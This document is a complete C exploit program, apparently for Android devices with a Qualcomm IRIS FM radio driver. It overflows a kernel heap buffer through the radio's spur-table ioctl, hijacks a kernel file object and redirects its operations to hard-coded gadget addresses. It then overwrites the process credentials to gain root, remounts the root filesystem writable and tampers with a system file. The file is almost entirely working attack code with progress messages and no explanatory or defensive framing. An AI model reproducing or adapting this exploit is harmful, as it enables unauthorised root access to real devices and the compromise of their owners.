#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include <fcntl.h> 
#include <sys/types.h>
#include <string.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <errno.h>
#include <sys/capability.h>
#include <linux/videodev2.h>
#include <linux/v4l2-controls.h>

typedef unsigned int kuid_t;
typedef unsigned int kgid_t;
#define atomic_t unsigned int
typedef unsigned long long kernel_cap_t;

struct cred {
    atomic_t    usage;
    /*
    atomic_t    subscribers;
    void        *put_addr;
    unsigned    magic;
    */
    kuid_t      uid;        /* real UID of the task */
    kgid_t      gid;        /* real GID of the task */
    kuid_t      suid;       /* saved UID of the task */
    kgid_t      sgid;       /* saved GID of the task */
    kuid_t      euid;       /* effective UID of the task */
    kgid_t      egid;       /* effective GID of the task */
    kuid_t      fsuid;      /* UID for VFS ops */
    kgid_t      fsgid;      /* GID for VFS ops */
    unsigned securebits;
    kernel_cap_t    cap_inheritable; /* caps our children can inherit */
    kernel_cap_t    cap_permitted;  /* caps we're permitted */
    kernel_cap_t    cap_effective;  /* caps we can actually use */

};

enum v4l2_cid_private_iris_t {
	V4L2_CID_PRIVATE_IRIS_SRCHMODE = (0x08000000 + 1),
	V4L2_CID_PRIVATE_IRIS_SCANDWELL,
	V4L2_CID_PRIVATE_IRIS_SRCHON,
	V4L2_CID_PRIVATE_IRIS_STATE,
	V4L2_CID_PRIVATE_IRIS_TRANSMIT_MODE,
	V4L2_CID_PRIVATE_IRIS_RDSGROUP_MASK,
	V4L2_CID_PRIVATE_IRIS_REGION,
	V4L2_CID_PRIVATE_IRIS_SIGNAL_TH,
	V4L2_CID_PRIVATE_IRIS_SRCH_PTY,
	V4L2_CID_PRIVATE_IRIS_SRCH_PI,
	V4L2_CID_PRIVATE_IRIS_SRCH_CNT,
	V4L2_CID_PRIVATE_IRIS_EMPHASIS,
	V4L2_CID_PRIVATE_IRIS_RDS_STD,
	V4L2_CID_PRIVATE_IRIS_SPACING,
	V4L2_CID_PRIVATE_IRIS_RDSON,
	V4L2_CID_PRIVATE_IRIS_RDSGROUP_PROC,
	V4L2_CID_PRIVATE_IRIS_LP_MODE,
	V4L2_CID_PRIVATE_IRIS_ANTENNA,
	V4L2_CID_PRIVATE_IRIS_RDSD_BUF,
	V4L2_CID_PRIVATE_IRIS_PSALL,  /*0x8000014*/

	/*v4l2 Tx controls*/
	V4L2_CID_PRIVATE_IRIS_TX_SETPSREPEATCOUNT,
	V4L2_CID_PRIVATE_IRIS_STOP_RDS_TX_PS_NAME,
	V4L2_CID_PRIVATE_IRIS_STOP_RDS_TX_RT,
	V4L2_CID_PRIVATE_IRIS_IOVERC,
	V4L2_CID_PRIVATE_IRIS_INTDET,
	V4L2_CID_PRIVATE_IRIS_MPX_DCC,
	V4L2_CID_PRIVATE_IRIS_AF_JUMP,
	V4L2_CID_PRIVATE_IRIS_RSSI_DELTA,
	V4L2_CID_PRIVATE_IRIS_HLSI, /*0x800001d*/

	/*Diagnostic commands*/
	V4L2_CID_PRIVATE_IRIS_SOFT_MUTE,
	V4L2_CID_PRIVATE_IRIS_RIVA_ACCS_ADDR,
	V4L2_CID_PRIVATE_IRIS_RIVA_ACCS_LEN,
	V4L2_CID_PRIVATE_IRIS_RIVA_PEEK,
	V4L2_CID_PRIVATE_IRIS_RIVA_POKE,
	V4L2_CID_PRIVATE_IRIS_SSBI_ACCS_ADDR,
	V4L2_CID_PRIVATE_IRIS_SSBI_PEEK,
	V4L2_CID_PRIVATE_IRIS_SSBI_POKE,
	V4L2_CID_PRIVATE_IRIS_TX_TONE,
	V4L2_CID_PRIVATE_IRIS_RDS_GRP_COUNTERS,
	V4L2_CID_PRIVATE_IRIS_SET_NOTCH_FILTER, /* 0x8000028 */
	V4L2_CID_PRIVATE_IRIS_SET_AUDIO_PATH, /* TAVARUA specific command */
	V4L2_CID_PRIVATE_IRIS_DO_CALIBRATION,
	V4L2_CID_PRIVATE_IRIS_SRCH_ALGORITHM, /* TAVARUA specific command */
	V4L2_CID_PRIVATE_IRIS_GET_SINR,
	V4L2_CID_PRIVATE_INTF_LOW_THRESHOLD,
	V4L2_CID_PRIVATE_INTF_HIGH_THRESHOLD,
	V4L2_CID_PRIVATE_SINR_THRESHOLD,
	V4L2_CID_PRIVATE_SINR_SAMPLES,
	V4L2_CID_PRIVATE_SPUR_FREQ,
	V4L2_CID_PRIVATE_SPUR_FREQ_RMSSI,
	V4L2_CID_PRIVATE_SPUR_SELECTION,
	V4L2_CID_PRIVATE_UPDATE_SPUR_TABLE,
	V4L2_CID_PRIVATE_VALID_CHANNEL,
	V4L2_CID_PRIVATE_AF_RMSSI_TH,
	V4L2_CID_PRIVATE_AF_RMSSI_SAMPLES,
	V4L2_CID_PRIVATE_GOOD_CH_RMSSI_TH,
	V4L2_CID_PRIVATE_SRCHALGOTYPE,
	V4L2_CID_PRIVATE_CF0TH12,
	V4L2_CID_PRIVATE_SINRFIRSTSTAGE,
	V4L2_CID_PRIVATE_RMSSIFIRSTSTAGE,
	V4L2_CID_PRIVATE_RXREPEATCOUNT,

	/*using private CIDs under userclass*/
	V4L2_CID_PRIVATE_IRIS_READ_DEFAULT = 0x00980928,
	V4L2_CID_PRIVATE_IRIS_WRITE_DEFAULT,
	V4L2_CID_PRIVATE_IRIS_SET_CALIBRATION,
	V4L2_CID_PRIVATE_IRIS_SET_SPURTABLE = 0x0098092D,
	V4L2_CID_PRIVATE_IRIS_GET_SPUR_TBL  = 0x0098092E,
};

#define RADIO_DEVICE "/dev/radio0"
#define TARGET_FILE "/etc/xtwifi.conf"

#define V4L2_CTRL_ID2CLASS(id)    ((id) & 0x0fff0000UL)

int main() {
    int radio_fd, ret_val;
    struct v4l2_capability radio_caps;
    
    printf("[*] current uid: %d\n", getuid());

    printf("[*] opening %s...\n", RADIO_DEVICE);

    radio_fd = open(RADIO_DEVICE, O_RDWR);
    if(radio_fd < 0) {
        printf("[-] opening Failed: %d\n", radio_fd);
        return -1;
    }
    
    struct v4l2_ext_controls ext_ctrls;
    //struct v4l2_ext_control child_control;

    int i;
    int fds[35];
    printf("[*] attemping to stabilize kernel heap...\n");
    for(i=0; i<35;i++)
        fds[i] = open(TARGET_FILE, O_RDONLY);

    memset(&ext_ctrls, 0 , sizeof(ext_ctrls));

    void *addr;
    addr = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if ((unsigned long long)addr == -1)
    {
        printf("[-] mmap failed landing page\n");
        exit(1);
    }
    printf("[*] mapped landing page at %p\n", addr);
    memset((unsigned char *)addr, 0, 0x1000);

    unsigned long long *mal_fops;
    mal_fops = (unsigned long long *)mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    if (mal_fops == NULL)
    {
        printf("[-] mmap failed mal_fops\n");
        exit(1);
    }
    printf("[*] malicious fops at %p\n", mal_fops);

    /* set file operations table to an arbitrary write gadget */
    mal_fops[0] = 0;
    for (i=1;i<13;i++) {
       mal_fops[i] = 0xFFFFFFC000223E2C; // str x2, [x1]; ret;
    }

    unsigned char payload[266]; 
    int hijacked_fd;
    unsigned long long *my_file = (unsigned long long *)addr;

    fflush(stdout);
    while (*my_file == 0) {
        memset(payload, 0xff, sizeof(payload));
        payload[0] = 0x3; // mode, doesn't matter
        payload[1] = 0xc; // number of entries, kmalloc(X * 20)

        /* positioned to overwrite the next pointer in the kernel heap */
        ((unsigned long long *)(payload+2))[32] = (unsigned long long)addr;

        ext_ctrls.count = 0x1;
        ext_ctrls.controls = (struct v4l2_ext_control*)malloc(sizeof(struct v4l2_ext_control));

        ext_ctrls.controls[0].id = V4L2_CID_PRIVATE_IRIS_SET_SPURTABLE;
        ext_ctrls.ctrl_class = V4L2_CTRL_ID2CLASS(ext_ctrls.controls[0].id);
        ext_ctrls.controls[0].string = payload;
        ext_ctrls.controls[0].size = sizeof(payload);
        errno = 0;

        printf("[!] attempting overflow...\n");
        ret_val = ioctl(radio_fd, VIDIOC_S_EXT_CTRLS, &ext_ctrls);

        for (i=0; i<15; i++) {
            // DEBUG 
            // printf("[*] allocating file %d\n", i);
            fds[i] = open(TARGET_FILE, O_RDONLY);
            if (*my_file) {
                hijacked_fd = fds[i];
                printf("[+] hijacked file object, correlates to fd %d\n", hijacked_fd);
                fflush(stdout);
                break;
            }
        }
        if (*my_file == 0) { 
            close(fds[0]);
        }
    }

    close(radio_fd);

    printf("[!] overwriting hijacked file struct\n");
    my_file[5] = (unsigned long long)mal_fops;
    struct cred *f_cred = (struct cred *)my_file[14];

    printf("[+] cred pointer: %p\n", f_cred);

    printf("[!] writing over the cred struct\n");
    fflush(stdout);

    /* TODO: possible we can just write over one of
     * these and then call setreuid */

    /* write over f_cred->uid and f_cred->gid*/
    lseek(hijacked_fd, (off_t) &f_cred->uid, 0);
    /* write over f_cred->suid and f_cred->sgid*/
    lseek(hijacked_fd, (off_t) &f_cred->suid, 0);
    /* write over f_cred->euid and f_cred->egid*/
    lseek(hijacked_fd, (off_t) &f_cred->euid, 0);
    /* write over f_cred->fsuid and f_cred->fsgid*/
    lseek(hijacked_fd, (off_t) &f_cred->fsuid, 0);

    /* turn off selinux */
    // lseek(hijacked_fd, (off_t) 0xffffffc0016425b4, 0);

    // set up some nicer primitives
    // for arbitrary read we can leak values through lseek's return code
    // for *nearly* arbitrary write we can use ioctl

    /* owner */ 
    mal_fops[0] = 0;
    for (i=1;i<13;i++) {
       /* everything including ioctl */
       mal_fops[i] = 0xFFFFFFC000227244; // str x1, [x2]; ret
    }
    /* lseek */
    mal_fops[1] = 0xFFFFFFC00027F3B0; // ldr x0, [x1]; ret

    /*
     * arbitrary reads can be done through lseek
    // leaks through lseek's return code
    printf("selinux_enforcing: %llx\n", (unsigned long long) lseek(hijacked_fd, ((off_t) 0xffffffc0016425b4), 1));
    */

    // write over the effective creds
    ioctl(hijacked_fd, -1, (&f_cred->cap_effective));

    if (!getuid()) {
        printf("[+] got root\n");
        
        int sh_fd;
        int bkd_fd;
        size_t rd;

        struct __user_cap_header_struct ch;
        struct __user_cap_data_struct cd;

        memset((char *)&cd, 0x41, sizeof(cd));

        ch.version = 0x20080522;
        ch.pid = getpid();

        if (capget(&ch, &cd) < 0)
        {
            perror("capget");
            return -1;
        }

        if (cd.effective != -1)
        {
            printf("[-] failed to set capabilities\n");
            return -1;
        }

        printf("[!] remounting / as rw\n");
        if (mount("/", "/", "ext4", MS_REMOUNT, "") < 0) {
            perror("mount");
            printf("[-] failed remounting / as rw\n");
        }

        sh_fd = open("/property_contexts", O_WRONLY);
        if (sh_fd < 0) {
            perror("open");
            printf("[-] failed openning target file\n");
        }

        write(sh_fd, "# owned", 7);

        close(sh_fd);

        printf("[*] exploit done\n");
        
    } else {
        printf("[-] failed to get root\n");
    }

    while(1)
        ;

}
